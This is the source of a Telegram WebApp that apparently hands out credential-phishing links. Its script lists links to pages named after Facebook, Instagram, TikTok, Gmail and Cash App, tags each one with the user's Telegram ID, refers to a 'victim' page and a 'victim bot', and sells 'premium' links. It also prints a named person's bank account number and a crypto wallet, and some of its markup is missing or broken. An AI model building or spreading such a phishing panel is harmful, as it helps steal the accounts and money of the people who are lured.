<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Intelligent Verification Linkbot - WebApp</title>
  <style>
    /* Reset and basics */
    * {
      margin: 0; padding: 0; box-sizing: border-box;
    }
    body, html {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
      color: #eee;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      padding-bottom: 60px;
    }
    header {
      background: #111;
      padding: 18px 20px;
      text-align: center;
      font-weight: 700;
      font-size: 1.6rem;
      letter-spacing: 1.2px;
      border-bottom: 1px solid #222;
      user-select: none;
    }
    main {
      flex-grow: 1;
      overflow-y: auto;
      padding: 15px 20px;
    }
    .page {
      display: none;
      max-width: 600px;
      margin: 0 auto;
    }
    .page.active {
      display: block;
    }
    h2 {
      color: #00ff99;
      margin-bottom: 15px;
      text-align: center;
      font-weight: 700;
    }
    p {
      line-height: 1.5;
      max-width: 600px;
      margin: 0 auto 15px auto;
      font-size: 1.05rem;
    }

    /* Link list styling */
    ul.link-list {
      list-style: none;
      padding-left: 0;
      margin: 10px auto;
      max-width: 600px;
    }
    ul.link-list li {
      background: #222;
      margin: 12px 0;
      border-radius: 12px;
      display: flex;
      align-items: center;
      padding: 12px 15px;
      transition: background 0.3s ease;
      cursor: pointer;
    }
    ul.link-list li:hover {
      background: #00ff99;
      color: #000;
    }
    ul.link-list li img {
      height: 50px;
      width: 50px;
      object-fit: contain;
      margin-right: 15px;
      border-radius: 8px;
      flex-shrink: 0;
      border: 1.5px solid #00ff99;
      background: #111;
    }
    ul.link-list li a {
      color: inherit;
      text-decoration: none;
      font-weight: 600;
      font-size: 1.1rem;
      flex-grow: 1;
      user-select: none;
    }

    /* Button styles */
.btn {
  background: #00ff99;
  color: #000;
  padding: 6px 12px;  /* smaller padding for copy/open buttons */
  font-weight: 700;
  border: none;
  border-radius: 12px;
  cursor: pointer;
  text-align: center;
  font-size: 0.9rem;
  transition: background 0.3s ease;
  user-select: none;
}
    .btn:hover {
      background: #00cc77;
    }

    /* Disabled button */
    .btn.disabled {
      background: #666;
      cursor: not-allowed;
      color: #ccc;
    }

    /* Donate section styles */
    .donation-info {
      max-width: 600px;
      margin: 0 auto;
      background: #222;
      padding: 20px;
      border-radius: 12px;
      line-height: 1.5;
      font-size: 1.05rem;
      text-align: center;
    }
    .donation-info strong {
      color: #00ff99;
    }
    .crypto-address {
      font-family: monospace;
      background: #111;
      padding: 10px;
      border-radius: 8px;
      margin-top: 10px;
      user-select: all;
      word-break: break-all;
    }

    /* Bottom navigation */
    .bottom-nav {
      position: fixed;
      bottom: 0;
      left: 0; right: 0;
      height: 56px;
      background: #111;
      border-top: 1px solid #222;
      display: flex;
      justify-content: space-around;
      align-items: center;
      z-index: 1000;
      user-select: none;
    }
    .bottom-nav button {
      background: none;
      border: none;
      color: #eee;
      font-size: 1.35rem;
      display: flex;
      flex-direction: column;
      align-items: center;
      cursor: pointer;
      transition: color 0.25s ease;
      width: 60px;
    }
    .bottom-nav button span {
      font-size: 0.75rem;
      margin-top: 2px;
      font-weight: 600;
    }
    .bottom-nav button.active {
      color: #00ff99;
      font-weight: 700;
    }
    /* Responsive adjustments */
    @media (max-width: 400px) {
      ul.link-list li {
        flex-direction: column;
        align-items: flex-start;
      }
      ul.link-list li img {
        margin-bottom: 8px;
        margin-right: 0;
      }
    }
  </style>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
  <header>

  <main>
    <!-- Home Section -->
    <section id="home" class="page active" aria-label="Home Section">
      <h2>Free Links</h2>

      <button id="openBotBtn" class="btn" aria-label="Open intelligentverificationlinkbot">
        üëâ Open Bot

  </main>

  <nav class="bottom-nav" role="navigation" aria-label="Main Navigation">
    <button id="navHome" class="active" aria-current="page" aria-label="Home">

  </nav>

  <script src="premiumlist.js"></script>
  <script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    // User info from Telegram WebApp
    const user = tg.initDataUnsafe?.user || null;
    const telegramId = user?.id || null;

    // Elements
    const freeLinksList = document.getElementById('freeLinksList');
    const premiumContent = document.getElementById('premiumContent');
    const donationInfo = document.getElementById('donationInfo');
    const openBotBtn = document.getElementById('openBotBtn');

    // Navigation buttons
    const navButtons = {
      home: document.getElementById('navHome'),
      premium: document.getElementById('navPremium'),
      victim: document.getElementById('navVictim'),
      donate: document.getElementById('navDonate')
    };

    // Pages
    const pages = {
      home: document.getElementById('home'),
      premium: document.getElementById('premium'),
      victim: document.getElementById('victim'),
      donate: document.getElementById('donate')
    };

    // Free links array - you can add more links here with images and URLs using template {telegram-id} for insertion
    const freeLinks = [
      {
        name: "Link1",
        image: "https://rrloaty.github.io/intelligent/img/face.png",
        urlTemplate: "https://rrloaty.github.io/a/face.html?id={telegram-id}"
      },
{
        name: "Link2",
        image: "https://rrloaty.github.io/intelligent/img/inst.png",
        urlTemplate: "https://rrloaty.github.io/a/inst.html?id={telegram-id}"
      },
      {
        name: "Link3",
        image: "https://rrloaty.github.io/intelligent/img/tiktok.png",
        urlTemplate: "https://rrloaty.github.io/a/tiktok.html?id={telegram-id}"
      },
      {
        name: "Link4",
        image: "https://rrloaty.github.io/intelligent/img/gma.png",
        urlTemplate: "https://rrloaty.github.io/a/gma.html?id={telegram-id}"
      },
      {
        name: "Link5",
        image: "https://rrloaty.github.io/intelligent/img/tiktok.png",
        urlTemplate: "https://rrloaty.github.io/a/tiktok.html?id={telegram-id}"
      },
      {
        name: "Link6",
        image: "https://rrloaty.github.io/intelligent/img/cash.png",
        urlTemplate: "https://rrloaty.github.io/a/cash.html?id={telegram-id}"
      }
      // Add more free links here as needed
    ];

    // Premium links array - you can add more here (images, names, URLs)
    const premiumLinks = [
      {
        name: "Premium 1",
        image: "https://bbott52.github.io/Mobixhub/image.png",
        urlTemplate: "https://bbott52.github.io/Mobixhub/?promo={telegram-id}"
      }
      // Add more premium links here
    ];

    // Function to replace {telegram-id} placeholder in URL
    function formatUrl(template) {
      if (!telegramId) return "#"; // no telegram id fallback
      return template.replace("{telegram-id}", telegramId);
    }

// Render free links list
    function renderFreeLinks() {
  freeLinksList.innerHTML = "";
  freeLinks.forEach(link => {
    const li = document.createElement("li");

    const img = document.createElement("img");
    img.src = link.image;
    img.alt = link.name;

    // The formatted URL string with the telegram ID
    const fullUrl = formatUrl(link.urlTemplate);

    // Create a div for URL text, selectable by user
    const urlText = document.createElement("div");
    urlText.textContent = fullUrl;
    urlText.style.flexGrow = "1";
    urlText.style.marginRight = "15px";
    urlText.style.fontFamily = "monospace";
    urlText.style.fontSize = "0.9rem";
    urlText.style.userSelect = "text";
    urlText.style.wordBreak = "break-all";

    // Copy button
    const copyBtn = document.createElement("button");
    copyBtn.textContent = "Copy";
    copyBtn.className = "btn";
    copyBtn.style.marginRight = "8px";
    copyBtn.style.flexShrink = "0";
    copyBtn.style.fontSize = "0.9rem";
    copyBtn.style.padding = "6px 12px";
    copyBtn.addEventListener("click", () => {
      navigator.clipboard.writeText(fullUrl).then(() => {
        copyBtn.textContent = "Copied!";
        setTimeout(() => (copyBtn.textContent = "Copy"), 1500);
      });
    });

    // Open button
    const openBtn = document.createElement("button");
    openBtn.textContent = "Open";
    openBtn.className = "btn";
    openBtn.style.flexShrink = "0";
    openBtn.style.fontSize = "0.9rem";
    openBtn.style.padding = "6px 12px";
    openBtn.addEventListener("click", () => {
      window.open(fullUrl, "_blank", "noopener");
    });

    // Append all to list item
    li.appendChild(img);
    li.appendChild(urlText);
    li.appendChild(copyBtn);
    li.appendChild(openBtn);

    freeLinksList.appendChild(li);
  });
}
    // Render premium links or message based on user access
    function renderPremiumLinks() {
      if (!telegramId) {
        premiumContent.innerHTML = `<p style="color:#ff6666; text-align:center;">Cannot detect your Telegram ID. Please open this WebApp inside Telegram.</p>`;
        return;
      }
      if (typeof premiumUsers === "undefined") {
        premiumContent.innerHTML = `<p style="color:#ff6666; text-align:center;">Premium list is missing. Please check premiumlist.js.</p>`;
        return;
      }
      if (premiumUsers.includes(telegramId)) {
        // Show premium links
        let html = '<ul class="link-list" style="max-width: 600px; margin: 0 auto;">';
        premiumLinks.forEach(link => {
          const url = formatUrl(link.urlTemplate);
          html += `
            <li>
              <img src="${link.image}" alt="${link.name}">
              <a href="${url}" target="_blank" rel="noopener noreferrer">${link.name}</a>
            </li>
          `;
        });
        html += "</ul>";
        premiumContent.innerHTML = html;
      } else {
        // Show upgrade message
        premiumContent.innerHTML = `
          <p style="color:#ffcc00; font-weight:700; text-align:center; margin-top: 20px;">
            Go premium to view or copy these links.<br>
            Message <a href="https://t.me/inamyophisintlinkbot" target="_blank" rel="noopener noreferrer" style="color:#00ff99; font-weight:700;">@inamyophisintlinkbot</a> to upgrade.
          </p>
        `;
      }
    }

    // Open victim bot with automatic /start command
    openBotBtn.addEventListener("click", () => {
      const botUsername = "intelligentverificationlinkbot";
      const url = `https://t.me/${botUsername}?start=start`;
      window.open(url, "_blank");
    });

    // Detect if user is from Nigeria or not (simple heuristic by timezone as fallback)
    function isUserInNigeria() {
      // Nigeria timezone UTC+1 => offset in minutes is -60
      const timezoneOffset = new Date().getTimezoneOffset();
      return timezoneOffset === -60;
    }

    // Render donation info based on country detection
    function renderDonationInfo() {
      if (isUserInNigeria()) {
        donationInfo.innerHTML = `
          <p>We appreciate your support to keep our brand running and promote our links.</p>
          <p><strong>Donation Account (Nigeria):</strong></p>
          <p>Account Number: <strong>9114301708</strong><br/>
          Bank: <strong>Opay</strong><br/>
          Account Name: <strong>Olatunji Abdumalik Ayomide</strong></p>
          <p>Thank you for your generosity!</p>
        `;
      } else {
        donationInfo.innerHTML = `
          <p>We appreciate your support to keep our brand running and promote our links.</p>
          <p><strong>Donate with crypto (BNB, USDT, BEP20):</strong></p>
          <p class="crypto-address">0xbBcc409872bC2441400735624638F3D67DAa7C4C</p>
          <p>Thank you for your generosity!</p>
        `;
      }
    }

    // Navigation button click handler
    function switchPage(pageKey) {
      Object.keys(pages).forEach(key => {
        pages[key].classList.toggle("active", key === pageKey);
        navButtons[key].classList.toggle("active", key === pageKey);
      });
    }

    // Hook up nav buttons
    Object.entries(navButtons).forEach(([key, btn]) => {
      btn.addEventListener("click", () => switchPage(key));
    });

    // Initialize app UI
    renderFreeLinks();
    renderPremiumLinks();
    renderDonationInfo();
    </script>
</body>
</html>
